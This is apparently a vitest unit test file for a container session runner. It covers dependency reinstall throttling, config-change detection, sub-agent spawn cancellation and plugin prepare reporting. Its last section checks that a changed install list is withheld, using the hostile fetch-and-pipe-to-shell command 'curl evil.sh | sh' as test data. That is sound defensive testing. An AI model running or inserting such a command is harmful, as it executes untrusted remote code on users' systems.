/**
 * Unit coverage for the #1622 dependency-change auto-reinstall: the dep-input
 * match predicate and the cooldown/trailing-edge throttle. The full
 * reinstall→gated-service restart flow is exercised by the install-gate
 * integration test (CI-run; integration tests OOM a session container).
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import http from "node:http";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import type { Socket } from "node:net";
import { ContainerSessionRunner } from "./container-session-runner.js";
import { WorkerAbortedError } from "./worker-http.js";
import { clearActivationState, getPluginPrepareFailures } from "./services/plugin-activation.js";
import type { WsServerMessage } from "../shared/types.js";
import {
  DEFAULT_SUB_AGENT_TIMEOUT_MS,
  SUB_AGENT_TRANSPORT_TIMEOUT_MS,
} from "../shared/sub-agent-run.js";

function makeRunner(): ContainerSessionRunner {
  // A non-placeholder workerUrl resolves `_workerReady` immediately; we never
  // hit the network because `runInstall` is spied out in the throttle tests.
  return new ContainerSessionRunner({
    sessionId: "s1",
    sessionDir: "/tmp/s1",
    defaultAgentId: "claude",
    workerUrl: "http://127.0.0.1:1",
  });
}

/** Reach the private members under test without widening the public surface. */
function priv(runner: ContainerSessionRunner): {
  isDepInputChange(paths: string[]): boolean;
  maybeReinstallForDepChange(): void;
} {
  return runner as unknown as {
    isDepInputChange(paths: string[]): boolean;
    maybeReinstallForDepChange(): void;
  };
}

describe("ContainerSessionRunner — dependency-input change detection (#1622)", () => {
  it("matches only declared dep-input files, normalizing a ./ prefix", () => {
    const runner = makeRunner();
    // No inputs set yet → never matches.
    expect(priv(runner).isDepInputChange(["package-lock.json"])).toBe(false);

    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
    expect(priv(runner).isDepInputChange(["package-lock.json"])).toBe(true);
    expect(priv(runner).isDepInputChange(["./package-lock.json"])).toBe(true);
    expect(priv(runner).isDepInputChange(["src/App.tsx", "package.json"])).toBe(true);
    expect(priv(runner).isDepInputChange(["src/App.tsx", "README.md"])).toBe(false);
  });

  it("treats an empty input set (non-keyable install) as never-matching", () => {
    const runner = makeRunner();
    runner.setDepReinstallInputs(["./build.sh"], []);
    expect(priv(runner).isDepInputChange(["package-lock.json"])).toBe(false);
  });
});

/**
 * Which changed files mean "the session's configuration moved".
 *
 * The conventional filenames are a guess at the project's compose file, and a
 * repo whose `compose:` block names something else (`deploy/compose.yml`) was
 * left out of it entirely: its own compose edits reached no reconcile at all,
 * and docs/262 req 20's plugin-service re-resolution — which hangs off this same
 * signal, because the project's service names seed the plugin name domain —
 * never ran against the edited file.
 */
describe("ContainerSessionRunner — config-file change detection", () => {
  /** Attach a manager stand-in without wiring its whole event surface. */
  function withComposeFile(runner: ContainerSessionRunner, file: string): void {
    (runner as unknown as { _serviceManager: unknown })._serviceManager = { composeFilePath: file };
  }

  const isConfig = (runner: ContainerSessionRunner, p: string): boolean =>
    (runner as unknown as { isConfigFileChange(p: string): boolean }).isConfigFileChange(p);

  it("matches the conventional names before any manager exists", () => {
    const runner = makeRunner();
    // This half must keep answering with no manager: a repo that ADDS a
    // `compose:` block has none yet, and that edit is what creates one.
    expect(isConfig(runner, "shipit.yaml")).toBe(true);
    expect(isConfig(runner, "./docker-compose.yml")).toBe(true);
    expect(isConfig(runner, "compose.yaml")).toBe(true);
    expect(isConfig(runner, "deploy/compose.yml")).toBe(false);
    expect(isConfig(runner, "src/App.tsx")).toBe(false);
  });

  it("also matches the compose file the session's config actually names", () => {
    const runner = makeRunner();
    withComposeFile(runner, "deploy/compose.yml");

    expect(isConfig(runner, "deploy/compose.yml")).toBe(true);
    expect(isConfig(runner, "./deploy/compose.yml")).toBe(true);
    // Still not every YAML under that directory.
    expect(isConfig(runner, "deploy/other.yml")).toBe(false);
  });

  it("normalizes a `./` the configured path itself carries", () => {
    const runner = makeRunner();
    withComposeFile(runner, "./deploy/compose.yml");
    expect(isConfig(runner, "deploy/compose.yml")).toBe(true);
  });
});

describe("ContainerSessionRunner — dependency-change reinstall throttle (#1622)", () => {
  beforeEach(() => vi.useFakeTimers());
  afterEach(() => vi.useRealTimers());

  it("reinstalls on the leading edge and coalesces a within-cooldown change into one trailing reinstall", async () => {
    const runner = makeRunner();
    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
    const install = vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });

    // First change → fires immediately.
    priv(runner).maybeReinstallForDepChange();
    expect(install).toHaveBeenCalledTimes(1);
    expect(install).toHaveBeenLastCalledWith(["npm ci"]);

    // Second change within the cooldown → suppressed, one trailing pass armed.
    vi.advanceTimersByTime(5_000);
    priv(runner).maybeReinstallForDepChange();
    expect(install).toHaveBeenCalledTimes(1);

    // After the cooldown elapses, exactly one trailing reinstall fires.
    await vi.advanceTimersByTimeAsync(30_000);
    expect(install).toHaveBeenCalledTimes(2);
  });

  it("does nothing when no install commands are configured", () => {
    const runner = makeRunner();
    runner.setDepReinstallInputs([], []);
    const install = vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });
    priv(runner).maybeReinstallForDepChange();
    expect(install).not.toHaveBeenCalled();
  });
});

/**
 * planning#280 — an in-flight sub-agent spawn must not vanish with its container.
 *
 * The incident: a backgrounded Codex consult was running when the user hit
 * Restart agent. `restartAgent` kills the PRIMARY agent on the worker, then
 * force-disposes the runner and destroys the container — nothing on that path
 * noticed the spawn. Its `/agent/spawn` request was sent `{ timeoutMs: 0 }`, so
 * it either hung forever on a half-open socket or rejected minutes later
 * through a runner that no longer had viewers. Either way the 15-minute review
 * produced no card, no error, and nothing for `shipit agent result` to read.
 *
 * `dispose()` is the chokepoint every force-teardown path funnels through
 * (Restart agent, Restart container, Rescue, archive, full reset), so cancelling
 * there covers all of them without patching each caller.
 */
describe("ContainerSessionRunner — sub-agent spawn cancellation (planning#280)", () => {
  it("aborts an in-flight spawn on dispose, rejecting the awaiting caller", async () => {
    const runner = makeRunner();
    // A silent worker: the request is accepted and never answered, which is
    // exactly what a container about to be SIGKILLed looks like.
    const server = http.createServer(() => { /* never respond */ });
    const sockets: Socket[] = [];
    server.on("connection", (s) => sockets.push(s));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const addr = server.address();
    if (typeof addr === "string" || !addr) throw new Error("no server address");
    runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);

    const spawn = runner.spawnSubAgent({
      agentId: "codex",
      prompt: "review the PR",
      spawnId: "spawn-1",
      depth: 0,
      // docs/261 req 7 — a spawn names the model it runs; the type requires it.
      model: "gpt-5.6-sol",
    });
    // Let the request reach the socket before tearing down.
    await new Promise((r) => setTimeout(r, 20));

    runner.dispose({ force: true });

    await expect(spawn).rejects.toBeInstanceOf(WorkerAbortedError);
    await expect(spawn).rejects.toThrow(/runner disposed/);

    for (const s of sockets) s.destroy();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  it("defers a lifecycle-driven dispose while a spawn is in flight", async () => {
    // A backgrounded consult outlives its turn, so `running` is false and idle
    // cleanup would otherwise reap a perfectly healthy 30-minute review.
    const runner = makeRunner();
    const server = http.createServer(() => { /* never respond */ });
    const sockets: Socket[] = [];
    server.on("connection", (s) => sockets.push(s));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const addr = server.address();
    if (typeof addr === "string" || !addr) throw new Error("no server address");
    runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);

    const spawn = runner.spawnSubAgent({
      agentId: "codex", prompt: "review", spawnId: "spawn-1", depth: 0, model: "gpt-5.6-sol",
    });
    await new Promise((r) => setTimeout(r, 20));

    runner.dispose(); // no force — idle cleanup
    expect(runner.disposed).toBe(false);

    // An explicit teardown still proceeds, and cancels the spawn.
    runner.dispose({ force: true });
    expect(runner.disposed).toBe(true);
    await expect(spawn).rejects.toBeInstanceOf(WorkerAbortedError);

    for (const s of sockets) s.destroy();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });

  it("bounds the transport so a worker that never answers can't hang forever", () => {
    // The worker's own wall-clock cap stays authoritative; this is the backstop
    // for when the worker is gone and its timer went with it.
    expect(SUB_AGENT_TRANSPORT_TIMEOUT_MS).toBeGreaterThan(DEFAULT_SUB_AGENT_TIMEOUT_MS);
    expect(Number.isFinite(SUB_AGENT_TRANSPORT_TIMEOUT_MS)).toBe(true);
  });
});

/**
 * planning#246 — what the sidebar dot and the chat status line report as "busy
 * outside a turn". A consult is the case the CLI's background-task list cannot
 * see: it outlives its parent turn, needs no resident streaming process, and
 * Codex reports no background tasks at all — so the union is what every marker
 * surface has to read.
 */
describe("ContainerSessionRunner — background-work marker", () => {
  it("names an in-flight consult, and stops naming it once the run settles", async () => {
    const runner = makeRunner();
    const server = http.createServer((_req, res) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ status: "success", text: "ok", truncated: false, durationMs: 1, costUsd: 0 }));
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const addr = server.address();
    if (typeof addr === "string" || !addr) throw new Error("no server address");
    runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);

    expect(runner.backgroundWorkDescriptions).toEqual([]);

    const spawn = runner.spawnSubAgent({
      agentId: "codex", prompt: "review", spawnId: "spawn-1", depth: 0, model: "gpt-5.6-sol",
    });
    // Read WITHOUT awaiting: `runSubAgent` announces the marker the moment
    // `spawnSubAgent` returns its promise, so the registration has to happen
    // synchronously, ahead of the method's first `await`. An `await` inserted
    // before it would make the consult invisible to the announcement — this
    // assertion is what turns that into a red build.
    expect(runner.backgroundWorkDescriptions).toEqual(["Codex consult"]);
    expect(runner.subAgentSpawnsInFlight).toBe(1);

    await spawn;
    expect(runner.backgroundWorkDescriptions).toEqual([]);

    await new Promise<void>((resolve) => server.close(() => resolve()));
  });
});

/**
 * docs/113 — the orchestrator-shutdown dispose must not reach into the worker.
 *
 * Keeping the container alive across an update is only half of "running turns
 * survive it". An ordinary forced dispose posts `/agent/kill`, which clears the
 * worker's `turnActive` (`agent-controller.ts` → `endTurn()`), and
 * `reattachInFlightTurns()` (docs/240) adopts a turn only while that flag is
 * true — so the CLI died inside a healthy container, its transcript tail was
 * never persisted and its post-turn commit never ran. That is the second half
 * of the 2026-08-10 incident, and it survived the first fix (containers stopped
 * being destroyed, turns kept dying).
 */
describe("ContainerSessionRunner — dispose({ preserveAgent }) (docs/113)", () => {
  /** A worker that records every path it is called on. */
  async function startRecordingWorker(): Promise<{
    url: string;
    paths: string[];
    close: () => Promise<void>;
  }> {
    const paths: string[] = [];
    const sockets: Socket[] = [];
    const server = http.createServer((req, res) => {
      paths.push(req.url ?? "");
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ killed: true }));
    });
    server.on("connection", (s) => sockets.push(s));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const addr = server.address();
    if (typeof addr === "string" || !addr) throw new Error("no server address");
    return {
      url: `http://127.0.0.1:${addr.port}`,
      paths,
      close: async () => {
        for (const s of sockets) s.destroy();
        await new Promise<void>((resolve) => server.close(() => resolve()));
      },
    };
  }

  /** Install a minimal live agent proxy in the runner's slot. */
  function installAgent(runner: ContainerSessionRunner): void {
    runner.setAgent({ runToken: "run-token-1" } as never);
  }

  it("does not kill the worker-side agent, so the next orchestrator can adopt the turn", async () => {
    const worker = await startRecordingWorker();
    const runner = makeRunner();
    runner.setWorkerUrl(worker.url);
    installAgent(runner);

    runner.dispose({ force: true, preserveAgent: true });

    // Give a fire-and-forget post every chance to land before asserting it didn't.
    await new Promise((r) => setTimeout(r, 50));

    expect(worker.paths).toEqual([]);
    expect(runner.disposed).toBe(true);
    // The local proxy is still dropped — it cannot outlive this process.
    expect(runner.getAgent()).toBeNull();

    await worker.close();
  });

  it("still kills the agent on an ordinary forced dispose (full reset, archive, Rescue)", async () => {
    const worker = await startRecordingWorker();
    const runner = makeRunner();
    runner.setWorkerUrl(worker.url);
    installAgent(runner);

    runner.dispose({ force: true });
    await new Promise((r) => setTimeout(r, 50));

    expect(worker.paths).toEqual(["/agent/kill"]);

    await worker.close();
  });

  it("leaves an in-flight sub-agent consult running on the preserve path", async () => {
    const server = http.createServer(() => { /* never respond */ });
    const sockets: Socket[] = [];
    server.on("connection", (s) => sockets.push(s));
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const addr = server.address();
    if (typeof addr === "string" || !addr) throw new Error("no server address");

    const runner = makeRunner();
    runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);
    const spawn = runner.spawnSubAgent({
      agentId: "codex", prompt: "review", spawnId: "spawn-1", depth: 0, model: "gpt-5.6-sol",
    });
    await new Promise((r) => setTimeout(r, 20));

    let settled = false;
    void (async () => {
      try { await spawn; } catch { /* rejection settles it too */ }
      settled = true;
    })();

    runner.dispose({ force: true, preserveAgent: true });
    await new Promise((r) => setTimeout(r, 50));

    // Not aborted: the consult keeps running in the container and stays
    // readable via `shipit agent result`. The awaiting promise dies with this
    // process, which is the point — nothing is left to hang.
    expect(settled).toBe(false);

    for (const s of sockets) s.destroy();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  });
});

/**
 * docs/262 req 13 — the container half of plugin prepare has to reach the
 * Plugins card. The worker knows what it could not materialize; the card is
 * rendered from the orchestrator's snapshot, so the result has to travel.
 */
describe("ContainerSessionRunner — plugin prepare results (docs/262 req 13)", () => {
  const SESSION = "plugin-prepare-session";

  /** A worker whose `/plugins/prepare` answers with whatever `body` holds. */
  async function withWorker(
    body: { current: unknown },
    run: (runner: ContainerSessionRunner, messages: WsServerMessage[]) => Promise<void>,
  ): Promise<void> {
    const server = http.createServer((_req, res) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(body.current));
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    const addr = server.address();
    if (typeof addr === "string" || !addr) throw new Error("no server address");
    const runner = new ContainerSessionRunner({
      sessionId: SESSION,
      sessionDir: "/tmp/s1",
      defaultAgentId: "claude",
      workerUrl: `http://127.0.0.1:${addr.port}`,
    });
    const messages: WsServerMessage[] = [];
    runner.on("message", (m) => messages.push(m));
    try {
      await run(runner, messages);
    } finally {
      runner.dispose({ force: true });
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  }

  beforeEach(() => clearActivationState(SESSION));
  afterEach(() => clearActivationState(SESSION));

  it("puts a skill the container could not materialize on that repository's card", async () => {
    await withWorker(
      { current: { skillsFailed: [{ repo: "tools", skill: "reqs/probe", reason: "has no readable SKILL.md" }] } },
      async (runner, messages) => {
        vi.spyOn(console, "warn").mockImplementation(() => undefined);
        await runner.preparePlugins();

        expect(getPluginPrepareFailures(SESSION, "tools")).toEqual([
          "Skill `reqs/probe`: has no readable SKILL.md",
        ]);
        // The settled hook already told the browser to refetch BEFORE this
        // request went out, so without a second push the tab would render the
        // snapshot that predates the answer.
        expect(messages.map((m) => m.type)).toContain("plugin_repos_updated");
      },
    );
  });

  it("says nothing when a healthy prepare changes nothing", async () => {
    await withWorker({ current: { skillsFailed: [] } }, async (runner, messages) => {
      await runner.preparePlugins();
      expect(getPluginPrepareFailures(SESSION, "tools")).toEqual([]);
      expect(messages).toEqual([]);
    });
  });

  it("clears a recorded failure once a later pass reports it fixed", async () => {
    const body: { current: unknown } = {
      current: { skillsFailed: [{ repo: "tools", skill: "reqs/probe", reason: "has no readable SKILL.md" }] },
    };
    await withWorker(body, async (runner, messages) => {
      vi.spyOn(console, "warn").mockImplementation(() => undefined);
      await runner.preparePlugins();
      expect(getPluginPrepareFailures(SESSION, "tools")).toHaveLength(1);

      // The plugin ships the skill and prepare runs again. The record is
      // replaced wholesale, so the card stops reporting a problem that is gone
      // — and the browser is told, because the set moved.
      body.current = { skillsFailed: [] };
      messages.length = 0;
      await runner.preparePlugins();

      expect(getPluginPrepareFailures(SESSION, "tools")).toEqual([]);
      expect(messages.map((m) => m.type)).toEqual(["plugin_repos_updated"]);
    });
  });

  it("keeps each repository's failures apart, and replaces them all at once (req 14)", async () => {
    const body: { current: unknown } = {
      current: {
        skillsFailed: [{ repo: "tools", skill: "reqs/probe", reason: "has no readable SKILL.md" }],
        linkFailed: [{ repo: "images", reason: "`/plugins/images` already exists" }],
      },
    };
    await withWorker(body, async (runner) => {
      vi.spyOn(console, "warn").mockImplementation(() => undefined);
      await runner.preparePlugins();
      expect(getPluginPrepareFailures(SESSION, "tools")).toHaveLength(1);
      expect(getPluginPrepareFailures(SESSION, "images")).toEqual(["`/plugins/images` already exists"]);

      // One repository is fixed, the other is not. The container pass is always
      // whole-declaration, so one response describes both.
      body.current = { skillsFailed: [{ repo: "tools", skill: "reqs/probe", reason: "has no readable SKILL.md" }] };
      await runner.preparePlugins();
      expect(getPluginPrepareFailures(SESSION, "tools")).toHaveLength(1);
      expect(getPluginPrepareFailures(SESSION, "images")).toEqual([]);
    });
  });

  it("leaves the last observed result standing when the container cannot be reached", async () => {
    await withWorker(
      { current: { skillsFailed: [{ repo: "tools", skill: "reqs/probe", reason: "has no readable SKILL.md" }] } },
      async (runner) => {
        vi.spyOn(console, "warn").mockImplementation(() => undefined);
        await runner.preparePlugins();
        expect(getPluginPrepareFailures(SESSION, "tools")).toHaveLength(1);

        // The worker goes away. Nothing reached the container's filesystem, so
        // what the last successful prepare left there is still what the agent
        // sees: clearing the record would report health nobody observed.
        runner.setWorkerUrl("http://127.0.0.1:1");
        await runner.preparePlugins();
        expect(getPluginPrepareFailures(SESSION, "tools")).toEqual([
          "Skill `reqs/probe`: has no readable SKILL.md",
        ]);
      },
    );
  });
});

/**
 * docs/271 / planning#400 — `runInstall` is the ONE place a session's
 * `agent.install` reaches the worker, so it is where the re-gate lives. These
 * exercise the short-circuit itself; the decision logic is covered in
 * `agent-install-gate.test.ts`.
 */
describe("ContainerSessionRunner — withholding a changed agent.install (docs/271)", () => {
  let dir: string;

  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), "runner-install-gate-"));
    fs.mkdirSync(path.join(dir, "workspace"), { recursive: true });
    // A plugin container has been prepared for this session (req 12's evidence).
    fs.mkdirSync(path.join(dir, "plugin-data", "probe", "state"), { recursive: true });
    // `npm ci` is what last actually ran here.
    const stateDir = path.join(dir, "state", "shared");
    fs.mkdirSync(stateDir, { recursive: true });
    fs.writeFileSync(
      path.join(stateDir, ".install-done"),
      JSON.stringify({
        version: 2,
        sourceCommit: "abc123",
        runtimeKey: "node-22",
        installCommands: ["npm ci"],
        depsHash: null,
        completedAt: "2026-08-17T00:00:00.000Z",
      }),
    );
  });

  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

  function runnerIn(sessionDir: string): ContainerSessionRunner {
    return new ContainerSessionRunner({
      sessionId: "s1",
      sessionDir,
      defaultAgentId: "claude",
      // Port 1 refuses connections: if the gate did NOT short-circuit, the POST
      // would fail and surface as an `install_status` error instead of `ok`.
      workerUrl: "http://127.0.0.1:1",
    });
  }

  it("does not reach the worker, reports once, and is not a failure", async () => {
    const runner = runnerIn(dir);
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const reported: string[] = [];
    runner.onInstallWithheld = (m) => reported.push(m);
    const emit = vi.spyOn(runner, "emitMessage").mockImplementation(() => undefined);

    const res = await runner.runInstall(["npm ci", "curl evil.sh | sh"]);

    // A withheld install is not a failure — the session keeps working on the
    // dependencies it already has (req 7).
    expect(res).toEqual({ ok: true });
    expect(emit).not.toHaveBeenCalled();
    expect(reported).toHaveLength(1);
    expect(reported[0]).toContain("curl evil.sh | sh");
    expect(reported[0]).toContain("npm ci");

    // A second pass — the container recreate case — withholds again but stays
    // quiet, so a user who has not acted does not collect one notice per resume.
    const again = await runnerIn(dir).runInstall(["npm ci", "curl evil.sh | sh"]);
    expect(again).toEqual({ ok: true });
    expect(reported).toHaveLength(1);
  });

  it("withholds silently when no reporting hook is wired", async () => {
    const runner = runnerIn(dir);
    vi.spyOn(console, "warn").mockImplementation(() => undefined);
    const emit = vi.spyOn(runner, "emitMessage").mockImplementation(() => undefined);

    // No `onInstallWithheld`: the gate's decision must not depend on whether
    // anyone is listening.
    await expect(runner.runInstall(["curl evil.sh | sh"])).resolves.toEqual({ ok: true });
    expect(emit).not.toHaveBeenCalled();
  });
});
